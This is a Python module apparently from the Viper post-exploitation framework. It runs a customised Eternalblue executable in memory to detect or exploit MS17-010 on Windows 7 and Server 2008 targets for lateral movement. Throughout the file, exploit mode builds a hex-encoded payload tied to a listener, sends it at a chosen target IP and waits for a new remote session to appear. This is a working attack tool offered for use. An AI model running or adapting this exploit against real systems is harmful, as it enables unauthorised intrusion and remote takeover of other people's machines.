# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFCSharpModule):
    NAME_ZH = "MS17-010利用(CSharp)"
    DESC_ZH = "模块内存执行定制版的Eternalblue.exe.\n" \
              "模块支持Detect和Exploit两种模式,支持利用Win7及Win2008的MS17-010利用.\n" \
              "与MSF官方MS17010利用程序相比,该模块在进行漏洞利用时所有网络流量在内网发送,无需从服务器经过Session路由转发到内网,成功率更高."

    NAME_EN = "MS17-010 Exploit (CSharp)"
    DESC_EN = "The module memory executes a customized version of Eternalblue.exe.\n" \
              "The module supports detect mode and exploit mode, and supports ms17-010 which using win7 and win2008\n" \
              "Compared with MSF's official ms17010 module, this module sends all network traffic in the intranet during vulnerability exploitation without forwarding from the server to the intranet through session route, and the success rate is higher"

    MODULETYPE = TAG2TYPE.Lateral_Movement
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = []  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/bm82n9"]
    REFERENCES = ["https://github.com/viper-sec/Eternalblue"]
    AUTHOR = ["Viper"]
    OPTIONS = register_options([
        OptionStr(name='host',
                  tag_zh="目标IP", desc_zh="横向移动目标的IP地址",
                  tag_en="Target IP", desc_en="The IP address of the lateral movement target",
                  required=True),

        OptionEnum(name='action',
                   tag_zh="操作",
                   desc_zh="<检测模式>确认目标主机是否存在漏洞,<利用模式>尝试加载进行漏洞利用并加载选择的载荷",
                   tag_en="Action",
                   desc_en="<Detect> confirm whether there are vulnerabilities on the target host, <Exploit> try to run vulnerability exploitation and load the selected load",
                   required=True,
                   default="detect",
                   enum_list=[
                       {'tag_zh': "检测模式", 'tag_en': "Detect", 'value': "detect"},
                       {'tag_zh': "利用模式", 'tag_en': "Exploit", 'value': "exploit"},
                   ]),

        OptionHander(required=False),
        OptionInt(name='wait',
                  tag_zh="等待时间(秒)", desc_zh="读取输出信息前等待的秒数",
                  tag_en="Waiting time (seconds)",
                  desc_en="The number of seconds to wait before reading the output information",
                  required=True, default=10),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)
        if session.is_windows is not True:
            return False, "此模块只支持Windows的Meterpreter", "This module only supports Meterpreter for Windows"

        payload_hex = self.generate_payload("hex")

        self.set_assembly("Eternalblue")
        self.set_execute_wait(self.param("wait"))

        if self.param("action") == "detect":
            args = f'{self.param("action")} {self.param("host")}'
        else:
            payload_hex = self.generate_payload("hex")
            if payload_hex is None:
                return False, "执行利用模式时请选着正确的监听", "Please select the correct handler when executing the exploit mode"
            else:
                args = f'{self.param("action")} {self.param("host")} {payload_hex.decode("utf-8")}'

        self.set_arguments(args)
        return True, None

    def callback(self, status, message, data):
        assembly_out = self.get_console_output(status, message, data)
        self.log_info("结果输出:", "Result output")
        self.log_raw(assembly_out)
        if self.param("action") == "exploit":
            self.log_info("请等待10s-20s,观察是否有新Session上线", "Please wait 10s-20s to see if there is a new session online")
